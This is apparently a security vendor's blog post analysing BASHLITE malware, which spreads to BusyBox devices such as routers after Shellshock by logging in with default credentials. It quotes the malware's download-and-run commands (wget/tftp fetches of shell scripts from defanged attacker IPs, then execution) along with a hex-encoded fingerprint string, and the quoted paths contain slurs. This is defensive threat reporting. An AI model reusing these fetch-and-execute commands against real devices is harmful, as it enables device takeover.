When news of the Shellshock vulnerability broke out at the end of September, we spotted
several attacks that leveraged the said vulnerability, thus manifesting the prevalence or even
evolution on how attackers used the exploit. For instance, attackers used Shellshock to
target SMTP servers, launch botnet attacks, and even to download KAITEN source code
among others. We have continuously monitored this vulnerability and on our latest research,
we observed that recent samples of BASHLITE (detected by Trend Micro
as ELF_BASHLITE.SMB) scans the network for devices/machines running on BusyBox, and
logs in using a set of usernames and passwords (see figure 4 below). Once a connection is
established, it runs the command to download and run bin.sh and bin2.sh scripts, gaining
control over the Busybox system. BusyBox is built on top of the Linux kernel and used by
small devices such as routers. Remote attackers can possibly maximize their control on
affected devices by deploying other components or malicious software into the system
depending on their motive. This is seen in the following commands:

cd /tmp busybox wget http://69[.]163[.]37[.]115/.niggers/bin.sh busybox tftp -r bin.sh -g
69[.1]63[.]37[.]115 sh bin.sh echo -e '\\x62\\x69\\x6e\\x66\\x61\\x67\\x74'\r\n cd /tmp/
busybox wget http://176[.]10[.]250[.]37/.niggers/bin2.sh busybox tftp -r bin2.sh -g
176[.]10[.]250[.]37 sh bin2.sh echo -e '\\x62\\x69\\x6e\\x66\\x61\\x67\\x74'\r\n
This means that the malware can do the following commands on the affected devices:
1. Change to the temporary folder where generally there is file write access
2. Download a remote file, depending on whether the shell script is hosted via HTTP or
TFTP. There is ‘fail-safe’ mechanism to achieve its download routine. This means that
if in the first command, it doesn’t execute any file, it will try again to connect to the URL
and download the file.
3. Run the downloaded shell script.
4. Perform previous “fingerprinting” routine, to check if the device runs on BusyBox.

Figure 1. Code snippets of BASHLITE downloading files via BusyBox
The previous BASHLITE sample (detected as ELF_BASHLITE.A) used BusyBox just to echo
the string 'gayfgt' if the remote malicious user invokes the command SCANNER ON:

Figure 3. Code snippet of ELF_BASHLITE.A where the string, ‘gayfgt’ is represented in octal
form
This is done to check if the device runs BusyBox, however it does not execute any
commands (unlike the new samples). BASHLITE attempts to log into the remote systems by
using the default set of usernames and passwords:

User Impact and Countermeasures Devices running on BusyBox can be possibly affected
by BASHLITE. As such, a remote attacker can issue commands or download other files on
the devices thus compromising its security. Since the initial discovery of Shellshock
vulnerability, Trend Micro has provided protection via Deep Security rules and Smart
Protection Network that detects the exploit and all related malware payload. We strongly
advised users to change the default usernames and passwords and disable remote shell if
possible to these devices. For more information on Shellshock vulnerability, you can read
